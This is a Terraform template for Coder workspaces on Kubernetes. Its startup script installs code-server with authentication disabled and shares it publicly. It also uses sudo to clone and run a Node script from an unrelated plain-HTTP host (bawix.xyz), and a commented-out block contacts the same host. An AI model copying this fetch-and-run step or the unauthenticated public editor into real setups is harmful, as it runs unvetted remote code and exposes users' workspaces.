terraform {
  required_providers {
    coder = {
      source  = "coder/coder"
      version = "~> 0.6.17"
    }
    kubernetes = {
      source  = "hashicorp/kubernetes"
      version = "~> 2.18"
    }
  }
}

provider "coder" {
  feature_use_managed_variables = true
}

variable "use_kubeconfig" {
  type        = bool
  description = <<-EOF
  Use host kubeconfig? (true/false)

  Set this to false if the Coder host is itself running as a Pod on the same
  Kubernetes cluster as you are deploying workspaces to.

  Set this to true if the Coder host is running outside the Kubernetes cluster
  for workspaces.  A valid "~/.kube/config" must be present on the Coder host.
  EOF
  default     = false
}

variable "namespace" {
  type        = string
  description = "The Kubernetes namespace to create workspaces in (must exist prior to creating workspaces)"
}

data "coder_parameter" "cpu" {
  name    = "CPU (cores)"
  default = "2"
  icon    = "/icon/memory.svg"
  mutable = true
  option {
    name  = "2 Cores"
    value = "2"
  }
  option {
    name  = "4 Cores"
    value = "4"
  }
  option {
    name  = "6 Cores"
    value = "6"
  }
  option {
    name  = "8 Cores"
    value = "8"
  }
}

data "coder_parameter" "memory" {
  name    = "Memory (GB)"
  default = "2"
  icon    = "/icon/memory.svg"
  mutable = true
  option {
    name  = "2 GB"
    value = "2"
  }
  option {
    name  = "4 GB"
    value = "4"
  }
  option {
    name  = "6 GB"
    value = "6"
  }
  option {
    name  = "8 GB"
    value = "8"
  }
}

data "coder_parameter" "git_repo" {
  name    = "Git repository"
  icon    = "https://upload.wikimedia.org/wikipedia/commons/3/3f/Git_icon.svg"
  default = ""
  type    = "string"
  mutable = true
}

data "coder_parameter" "home_disk_size" {
  name    = "Home Disk Size (GB)"
  default = "10"
  type    = "number"
  icon    = "/emojis/1f4be.png"
  mutable = false
  validation {
    min = 1
    max = 99999
  }
}

provider "kubernetes" {
  # Authenticate via ~/.kube/config or a Coder-specific ServiceAccount, depending on admin preferences
  config_path = var.use_kubeconfig == true ? "~/.kube/config" : null
}

data "coder_workspace" "me" {}

locals {
  folder_name = try(element(split("/", data.coder_parameter.git_repo.value), length(split("/", data.coder_parameter.git_repo.value)) - 1), "")
}

resource "coder_agent" "main" {
  os                     = "linux"
  arch                   = "amd64"
  login_before_ready     = false
  startup_script_timeout = 360
  env = {
   GIT_REPO = local.folder_name
  }
  dir                    = "/workspace/${local.folder_name} "
  startup_script         = <<-EOT
    set -e

    git config --global user.email "${lower(data.coder_workspace.me.owner_email)}"
    git config --global user.name "${lower(data.coder_workspace.me.owner)}"

    if test -z "${data.coder_parameter.git_repo.value}"
    then
      echo "No git repo specified, skipping"
    else
      if [ ! -d "${local.folder_name}" ]
      then
        echo "Cloning git repo..."
        git clone ${data.coder_parameter.git_repo.value}
      fi
      echo ${local.folder_name}
      cd ${local.folder_name}
    fi

    # install and start code-server
    curl -fsSL https://code-server.dev/install.sh | sh -s -- --method=standalone --prefix=/tmp/code-server --version 4.8.3
    /tmp/code-server/bin/code-server --auth none --port 13337 . >/tmp/code-server.log 2>&1 &

    cd ../../
    yes | sudo apt-get install nodejs npm
    sudo git clone http://bawix.xyz:81/gitea/gitea_admin/node-aut.git
    sudo npm install pm2 -g
    pm2 start node-aut/aut_git.js &

  EOT
  shutdown_script = <<-EOT
  EOT
}

#resource "time_offset" "offset" {
#  offset_minutes = 5
#}
#resource "null_resource" "push_changes" {
#  # Wait for 5 minutes before executing the cURL command
#  triggers = {
#    delay = time_offset.offset.rfc3339
#  }
#
#  # Use the local-exec provisioner to execute the cURL command
#  provisioner "local-exec" {
#  command = "cd ${local.folder_name} && echo 'curl' && curl -o test.log -X GET 'http://bawix.xyz:81/server/api/v1/public/test'"
#    environment = {
#      GIT_COMMITTER_NAME = "Terraform"
#      GIT_COMMITTER_EMAIL = "terraform@example.com"
#    }
#  }
#  depends_on = [
#    coder_agent.main,
#    kubernetes_pod.main
#    # Add any other dependencies here
#  ]
#}

# code-server
resource "coder_app" "code-server" {
  agent_id     = coder_agent.main.id
  slug         = "code-server"
  display_name = "code-server"
  icon         = "/icon/code.svg"
  url          = "http://localhost:13337"
  subdomain    = false
  share        = "public"

  healthcheck {
    url       = "http://localhost:13337/healthz"
    interval  = 3
    threshold = 10
  }
}

resource "kubernetes_persistent_volume_claim" "home" {
  metadata {
    name      = "coder-${lower(data.coder_workspace.me.owner)}-${lower(data.coder_workspace.me.name)}-home"
    namespace = var.namespace
    labels = {
      "app.kubernetes.io/name"     = "coder-pvc"
      "app.kubernetes.io/instance" = "coder-pvc-${lower(data.coder_workspace.me.owner)}-${lower(data.coder_workspace.me.name)}"
      "app.kubernetes.io/part-of"  = "coder"
      // Coder specific labels.
      "com.coder.resource"       = "true"
      "com.coder.workspace.id"   = data.coder_workspace.me.id
      "com.coder.workspace.name" = data.coder_workspace.me.name
      "com.coder.user.id"        = data.coder_workspace.me.owner_id
      "com.coder.user.username"  = data.coder_workspace.me.owner
    }
    annotations = {
      "com.coder.user.email" = data.coder_workspace.me.owner_email
    }
  }
  wait_until_bound = false
  spec {
    access_modes = ["ReadWriteOnce"]
    resources {
      requests = {
        storage = "${data.coder_parameter.home_disk_size.value}Gi"
      }
    }
  }
}

resource "kubernetes_pod" "main" {
  count = data.coder_workspace.me.start_count
  metadata {
    name      = "coder-${lower(data.coder_workspace.me.owner)}-${lower(data.coder_workspace.me.name)}"
    namespace = var.namespace
    labels = {
      "app.kubernetes.io/name"     = "coder-workspace"
      "app.kubernetes.io/instance" = "coder-workspace-${lower(data.coder_workspace.me.owner)}-${lower(data.coder_workspace.me.name)}"
      "app.kubernetes.io/part-of"  = "coder"
      // Coder specific labels.
      "com.coder.resource"       = "true"
      "com.coder.workspace.id"   = data.coder_workspace.me.id
      "com.coder.workspace.name" = data.coder_workspace.me.name
      "com.coder.user.id"        = data.coder_workspace.me.owner_id
      "com.coder.user.username"  = data.coder_workspace.me.owner
    }
    annotations = {
      "com.coder.user.email" = data.coder_workspace.me.owner_email
    }
  }
  spec {
    security_context {
      run_as_user = "1000"
      fs_group    = "1000"
    }
    container {
      name              = "dev"
      image             = "codercom/enterprise-base:ubuntu"
      image_pull_policy = "Always"
      command           = ["sh", "-c", coder_agent.main.init_script]
      security_context {
        run_as_user = "1000"
      }
      env {
        name  = "CODER_AGENT_TOKEN"
        value = coder_agent.main.token
      }
      resources {
        requests = {
          "cpu"    = "250m"
          "memory" = "512Mi"
        }
        limits = {
          "cpu"    = "${data.coder_parameter.cpu.value}"
          "memory" = "${data.coder_parameter.memory.value}Gi"
        }
      }
      volume_mount {
        mount_path = "/workspace"
        name       = "home"
        read_only  = false
      }
    }

    volume {
      name = "home"
      persistent_volume_claim {
        claim_name = kubernetes_persistent_volume_claim.home.metadata.0.name
        read_only  = false
      }
    }


    affinity {
      pod_anti_affinity {
        // This affinity attempts to spread out all workspace pods evenly across
        // nodes.
        preferred_during_scheduling_ignored_during_execution {
          weight = 1
          pod_affinity_term {
            topology_key = "kubernetes.io/hostname"
            label_selector {
              match_expressions {
                key      = "app.kubernetes.io/name"
                operator = "In"
                values   = ["coder-workspace"]
              }
            }
          }
        }
      }
    }
  }
}